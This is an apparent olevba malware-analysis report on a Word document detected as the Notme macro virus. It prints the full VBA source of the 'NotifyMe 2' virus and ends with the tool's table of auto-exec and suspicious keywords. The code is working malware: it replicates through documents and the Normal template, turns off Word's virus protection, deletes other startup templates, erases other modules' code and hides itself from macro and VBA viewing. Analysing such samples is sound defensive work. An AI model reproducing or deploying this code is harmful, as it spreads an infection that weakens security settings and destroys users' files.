olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Notme-ec9fd7e96580c7c84a587065a27f764b608a3d17
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Notme-ec9fd7e96580c7c84a587065a27f764b608a3d17 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NotifyMe2.bas 
in file: Virus.MSWord.Notme-ec9fd7e96580c7c84a587065a27f764b608a3d17 - OLE stream: 'Macros/VBA/NotifyMe2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'***************************************************************
' NotifyMe WordMacro Virus Project
' Version 2.10.02
' Created by Tohenk (c) Tohenk Software, 2000
' Date 02 February 2000
' Revised 15, 16, 24, 29 February 2000
' Activated 29 February 2000
' Dedicated to -All My Generation in this occupation
'              -We all have the same destiny
'              -Also specially to my family and my lover
'***************************************************************

' Global variables

Public N2_TIMED As Boolean
Public N2_CONF As Boolean
Public N2_GCONF As Boolean
Public N2_TCOUNT As Integer

' Internal variables

Private N2_ASAV
Private N2_DOCSAV As Boolean
Private Const N2_ID = "NotifyMe2"
Private Const N2_FSRC = ".n2s"
Private Const N2_FTEMP = ".dot"

' Private procedure for internal handling

Private Function N2_Infected(Src) As Boolean
  N2_Infected = False
  For Each Item In Src.VBProject.VBComponents
    If Item.Name = N2_ID Then
      If Item.CodeModule.CountOfLines <> 0 Then
        N2_Infected = True
      Else
        Application.OrganizerDelete Src.FullName, Item.Name, wdOrganizerObjectProjectItems
      End If
    End If
  Next Item
End Function

Private Sub N2_Copy(Src, Dest, Name)
  For Each Item In Name
    Application.OrganizerCopy Src, Dest.FullName, Item, wdOrganizerObjectProjectItems
  Next Item
  If Dest <> NormalTemplate Then
    With Dest.VBProject
      .Name = "NotifyMe"
      .Description = "NotifyMe 2 WordMacro Virus Project"
    End With
  End If
End Sub

Private Sub N2_Del(Src)
  For Each Item In Src.VBProject.VBComponents
    If Item.Name <> N2_ID And _
       Item.Name <> "ThisDocument" And _
       Item.Name <> "Reference to Normal" Then
         If Item.Type = vbext_ct_StdModule Then Item.CodeModule.DeleteLines 1, Item.CodeModule.CountOfLines
    End If
  Next Item
End Sub

Private Sub N2_CopyTo(Src, Dest)
  On Error Resume Next
  Dim MacroList(0)
  MacroList(0) = N2_ID
  N2_DOCSAV = False
  Call N2_Del(Dest)
  If Not N2_Infected(Dest) Then
    Call N2_Copy(Src, Dest, MacroList)
    N2_DOCSAV = True
  End If
End Sub

Private Sub N2_StampIt()
  With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Tohenk"
    .Title = "NotifyMe 2 WordMacro Virus"
    .Subject = "Just NOTIFY-ME to what I've done"
    .Comments = _
      "This was created and dedicated for: MY LITTLE SWEAT-GIRL " & _
      Chr(34) & Chr(78) & Chr(85) & Chr(78) & Chr(85) & Chr(75) & _
      Chr(34) & Chr(44) & Chr(32) & Chr(84) & Chr(65) & Chr(67) & _
      Chr(73) & Chr(75) & Chr(44) & Chr(32) & Chr(85) & Chr(76) & _
      Chr(70) & Chr(65) & Chr(44) & Chr(32) & Chr(78) & Chr(71) & _
      Chr(65) & Chr(78) & Chr(84) & Chr(72) & Chr(82) & Chr(85) & Chr(69) & ", aND SO on"
    .Execute
  End With
End Sub

Private Sub N2_D2T()
  N2_ASAV = Application.DisplayAlerts
  Application.DisplayAlerts = wdAlertsNone
  For Each Temp In Templates
    Call N2_CopyTo(ActiveDocument.FullName, Temp)
    If N2_DOCSAV Then Temp.Save
  Next Temp
  Application.DisplayAlerts = N2_ASAV
End Sub

Private Sub N2_T2D()
  N2_ASAV = Application.DisplayAlerts
  Application.DisplayAlerts = wdAlertsNone
  For Each Doc In Documents
    Call N2_CopyTo(NormalTemplate.FullName, Doc)
    Call N2_StampIt
  Next Doc
  Application.DisplayAlerts = N2_ASAV
End Sub

Private Sub N2_Master()
  Call N2_D2T
  Call N2_T2D
End Sub

Private Sub N2_ECopy()
  On Error Resume Next
  Src = Options.DefaultFilePath(wdStartupPath) & "\" & N2_ID & N2_FSRC
  Call N2_CopyTo(Src, NormalTemplate)
  Call N2_Master
  ActiveDocument.Saved = True
End Sub

Private Sub N2_RSF()
  SLoc = Options.DefaultFilePath(wdStartupPath)
  Sfile = Dir(SLoc & "\*" & N2_FTEMP)
  Do While Sfile <> ""
    If Sfile <> N2_ID & N2_FTEMP Then Kill SLoc & "\" & Sfile
    Sfile = Dir
  Loop
End Sub

Private Sub N2_CSF()
  SPath = Options.DefaultFilePath(wdStartupPath)
  SDoc = Dir(SPath & "\" & N2_ID & N2_FTEMP)
  If SDoc = "" Then
    Application.Visible = False
    Documents.Add
    Call N2_CopyTo(NormalTemplate.FullName, ActiveDocument)
    With ActiveDocument
      .SaveAs FileName:=SPath & "\" & N2_ID & N2_FSRC, FileFormat:=wdFormatDocument, AddToRecentFiles:=False
      .SaveAs FileName:=SPath & "\" & N2_ID & N2_FTEMP, FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
  End If
End Sub

Private Function N2_ActTime() As Boolean
  N2_ActTime = False
  If (Now >= DateSerial(2000, 4, 10)) And (Now <= DateSerial(2000, 5, 10)) Then N2_ActTime = True
End Function

Private Sub N2_OnTime()
  If Not Normal.NotifyMe2.N2_TIMED Then
    Application.OnTime When:=Now + TimeValue("00:30:00"), Name:=N2_ID & ".N2_Animate"
    Normal.NotifyMe2.N2_TIMED = True
  End If
End Sub

Private Sub N2_NA()
  Call N2_Message("Sorry, that's unavailable now!!!!!")
End Sub

' Common Procedure Handler

Sub AutoOpen()
  On Error Resume Next
  WordBasic.DisableAutoMacros False
  Application.EnableCancelKey = wdCancelDisabled
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Call N2_Master
  Call N2_OnTime
  If N2_ActTime Then Call N2_Confirm
End Sub

Sub AutoExit()
  If (Day(Now) = 2 And Month(Now) = 5) Or (Day(Now) = 1 And Month(Now) = 6) Or (Day(Now) = 19 And Month(Now) = 4) Or (Day(Now) = 22 And Month(Now) = 3) Then
    Call N2_Greet
  End If
  Call N2_RSF
  Call N2_CSF
  Application.Quit
End Sub

Sub AutoClose()
  Call N2_Master
  ActiveDocument.Close
End Sub

Sub AutoExec()
  On Error Resume Next
  WordBasic.DisableAutoMacros False
  Application.EnableCancelKey = wdCancelDisabled
  Options.VirusProtection = False
  Options.SaveNormalPrompt = False
  Call N2_ECopy
  AddIns.Unload False
  If N2_ActTime Then Call N2_Confirm
End Sub

Sub FileOpen()
  If Dialogs(wdDialogFileOpen).Show <> 0 Then
    Call N2_Master
    If N2_DOCSAV Then ActiveDocument.SaveAs ActiveDocument.Name, wdFormatDocument
  End If
End Sub

Sub FileSave()
  On Error Resume Next
  Call N2_Master
  If Not ActiveDocument.Saved Then ActiveDocument.Save
End Sub

Sub FileSaveAs()
  Dialogs(wdDialogFileSaveAs).Show
  Call N2_Master
End Sub

Sub FileNew()
  If Dialogs(wdDialogFileNew).Show <> 0 Then
    Call N2_Master
    ActiveDocument.Saved = True
  End If
End Sub

Sub FileNewDefault()
  Dialogs(wdDialogFileNew).Execute
  Call N2_Master
  ActiveDocument.Saved = True
End Sub

Sub FileExit()
  AutoExit
End Sub

' Virus Protection Section

Sub ToolsOptions()
  Call N2_Master
  With Options
    SSav = .DefaultFilePath(wdStartupPath)
    Dialogs(wdDialogToolsOptions).Show
    .VirusProtection = False
    .SaveNormalPrompt = False
    .DefaultFilePath(wdStartupPath) = SSav
  End With
End Sub

Sub ToolsMacro()
  On Error Resume Next
  Call N2_Master
  If MacroContainer = NormalTemplate Then
    N2_ASAV = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros True
    With Dialogs(wdDialogToolsMacro)
      .Description = "NotifyMe may always on your document and can't be deleted"
      If .Display = 1 Then .Execute
    End With
    Application.DisplayAlerts = N2_ASAV
  Else
    Application.Run NormalTemplate.VBProject.Name & "." & N2_ID & ".ToolsMacro"
  End If
End Sub

Sub ViewVBCode()
  Call N2_Master
  Call N2_NA
End Sub

Sub FileTemplates()
  Call N2_Master
  Dialogs(wdDialogToolsTemplates).Display
End Sub

' Virus Message/Action Section

Private Sub N2_CapRun(Text)
  Set WSrc = ActiveWindow
  OldCaption = WSrc.Caption
  Finish = False
  StartPos = 1
  Do
    WSrc.Caption = Right(Text, StartPos)
    STimer = Timer
    Do While Timer < STimer + 1
      DoEvents
    Loop
    StartPos = StartPos + 1
    If StartPos > Len(Text) Then Finish = True
  Loop Until Finish
  WSrc.Caption = OldCaption
End Sub

Sub N2_Animate()
  Application.WindowState = wdWindowStateMaximize
  Normal.NotifyMe2.N2_TCOUNT = Normal.NotifyMe2.N2_TCOUNT + 1
  ShowText = "NotifyMe in " & ActiveDocument.Name
  If Day(Now) = 4 And Month(Now) = 9 Then ShowText = "NotifyMe By Tohenk, Dedicated to " & Chr(110) & Chr(85) & Chr(110) & Chr(85) & Chr(107) & "..."
  Call N2_CapRun(ShowText)
  Normal.NotifyMe2.N2_TIMED = False
  Call N2_OnTime
  If (Normal.NotifyMe2.N2_TCOUNT = 2) And N2_ActTime Then AutoExit
End Sub

Private Sub N2_Confirm()
  If Not Normal.NotifyMe2.N2_CONF Then
    Call N2_Message _
    ("NotifyMe Message:" & vbCr & _
     "Sometimes, people should rest from doing something." & vbCr & _
     "Just NOTIFY-ME to what I've done." & vbCr & _
     "So, I suggest you not to continue your working cause" & vbCr & _
     "You'll get some troubles." & vbCr & vbCr & _
     "JUST LEAVE YOUR WORK NOW!!!?")
    Normal.NotifyMe2.N2_CONF = True
  End If
End Sub

Private Sub N2_Greet()
  If Not Normal.NotifyMe2.N2_GCONF Then
    Msg2 = ""
    Msg1 = "Sorry! I won't disturb you. But, It just my special greeting to:" & vbCr & vbCr & "     "
    Msg3 = vbCr & vbCr & "Today is her birthday. So you must greet her too. Okay?" & vbCr & vbCr
    If Day(Now) = 19 And Month(Now) = 4 Then
      Msg2 = "mY LiTtLe SWeAT-GIrL " & Chr(34) & Chr(110) & Chr(85) & Chr(110) & Chr(85) & Chr(107) & Chr(34)
    ElseIf Day(Now) = 2 And Month(Now) = 5 Then
      Msg2 = "MY BeST-FRieND " & Chr(34) & Chr(84) & Chr(97) & Chr(67) & Chr(105) & Chr(75) & Chr(34)
    ElseIf Day(Now) = 1 And Month(Now) = 6 Then
      Msg2 = "MY BeST-FRieND " & Chr(34) & Chr(117) & Chr(76) & Chr(70) & Chr(97) & Chr(34)
    Else
      Msg1 = "Hi, Who want to call up ""NGANTHRUE"" for me?" & vbCr & _
             "Just remain him that today he was get older and older." & vbCr & _
             "And tell him too, ""TOHENK"" greet him today. Okay?"
      Msg3 = ""
    End If
    Call N2_Message(Msg1 & Msg2 & Msg3)
    Normal.NotifyMe2.N2_GCONF = True
  End If
End Sub

Private Sub N2_Message(Msg)
  On Error Resume Next
  Beep
  With Assistant.NewBalloon
    .Heading = "NotifyMe"
    .Text = Msg
    .Icon = msoIconTip
    .Button = msoButtonSetOK
    .Show
  End With
End Sub

'END OF NOTIFYME-CODE
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

